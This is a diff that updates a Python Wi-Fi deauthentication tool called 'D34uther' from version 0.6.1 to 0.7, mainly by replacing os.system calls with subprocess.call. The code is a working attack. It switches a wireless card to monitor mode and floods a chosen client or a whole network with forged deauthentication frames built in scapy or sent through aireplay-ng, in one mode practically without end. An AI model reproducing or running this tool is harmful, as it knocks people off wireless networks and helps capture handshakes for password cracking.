@@ -1,4 +1,4 @@
-import os
+import subprocess
 from colorama import Fore, Back, Style
 from scapy.all import *
 
@@ -16,7 +16,7 @@ ________  ________     _____         __  .__
 
 Maded by Fr0z3n
 
-Version:0.6.1
+Version:0.7
 
 """)
 print(Fore.LIGHTRED_EX)
@@ -34,12 +34,12 @@ print("İnterface: "+interface)
 
 # Monitör moda geçiyoruz
 
-os.system('systemctl stop NetworkManager.service')
-os.system('ifconfig '+interface+' down')
-os.system('iwconfig '+interface+' mode monitor')
-os.system('ifconfig '+interface+' up')
+subprocess.call(["systemctl", "stop", "NetworkManager.service"])
+subprocess.call(["ifconfig", interface, "down"])
+subprocess.call(["iwconfig", interface, "mode", "monitor"])
+subprocess.call(["ifconfig", interface, "up"])
 
-os.system('clear')
+subprocess.call(["clear"])
 
 # Banner
 
@@ -55,7 +55,7 @@ print("""
 
 Maded by Fr0z3n
 
-Version:0.6.1
+Version:0.7
 
 """)
 
@@ -66,11 +66,11 @@ print(Back.RED)
 
 print("""
 
-1)for Handshake                       
-2)for Deauthentication (single target)
-3)for Deauthentication (network)(you need aireplay-ng for this)    
-99)Exit                               
-for Stop CTRL+C                       """ + Style.RESET_ALL)
+1)for Handshake                                                
+2)for Deauthentication (single target)                         
+3)for Deauthentication (network)(you need aireplay-ng for this)
+99)Exit                                                        
+for Stop CTRL+C                                                """ + Style.RESET_ALL)
 
 print(Fore.LIGHTBLUE_EX)
 
@@ -81,49 +81,44 @@ if choose==1:
   dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
   packet = RadioTap()/dot11/Dot11Deauth(reason=7)
   sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
-  os.system('systemctl start NetworkManager.service')
-  os.system('ifconfig '+interface+' down')
-  os.system('iwconfig '+interface+' mode managed')
-  os.system('ifconfig '+interface+' up')
+  subprocess.call(["systemctl", "start", "NetworkManager.service"])
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "managed"])
+  subprocess.call(["ifconfig", interface, "up"])
   print("Thanks for Using D34uther")
   exit
 if choose==2:
   dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
   packet = RadioTap()/dot11/Dot11Deauth(reason=7)
   sendp(packet, inter=0.1, count=99999999999, iface=interface, verbose=1)
-  os.system('systemctl start NetworkManager.service')
-  os.system('ifconfig '+interface+' down')
-  os.system('iwconfig '+interface+' mode managed')
-  os.system('ifconfig '+interface+' up')
+  subprocess.call(["systemctl", "start", "NetworkManager.service"])
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "managed"])
+  subprocess.call(["ifconfig", interface, "up"])
   print("Thanks for Using D34uther")
   exit
 if choose==3:
-  os.system('aireplay-ng --deauth 0 -a '+bssid+' '+interface)
-  os.system('systemctl start NetworkManager.service')
-  os.system('ifconfig '+interface+' down')
-  os.system('iwconfig '+interface+' mode managed')
-  os.system('ifconfig '+interface+' up')
+  subprocess.call(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
+  subprocess.call(["systemctl", "start", "NetworkManager.service"])
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "managed"])
+  subprocess.call(["ifconfig", interface, "up"])
   print("Thanks for Using D34uther")
   exit
 if choose==99:
-  os.system('ifconfig '+interface+' down')
-  os.system('iwconfig '+interface+' mode managed')
-  os.system('ifconfig '+interface+' up')
-  os.system('systemctl start NetworkManager.service')
+  subprocess.call(["systemctl", "start", "NetworkManager.service"])
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "managed"])
+  subprocess.call(["ifconfig", interface, "up"])
   exit
 else:
-  os.system('systemctl start NetworkManager.service')
-  os.system('ifconfig '+interface+' down')
-  os.system('iwconfig '+interface+' mode managed')
-  os.system('ifconfig '+interface+' up')
+  subprocess.call(["systemctl", "start", "NetworkManager.service"])
+  subprocess.call(["ifconfig", interface, "down"])
+  subprocess.call(["iwconfig", interface, "mode", "managed"])
+  subprocess.call(["ifconfig", interface, "up"])
   print("Thanks for Using D34uther")
   exit
 
 print(Style.RESET_ALL)
 
 input("Press Enter to Exit")
-
-os.system('systemctl start NetworkManager.service')
-os.system('ifconfig '+interface+' down')
-os.system('iwconfig '+interface+' mode managed')
-os.system('ifconfig '+interface+' up')
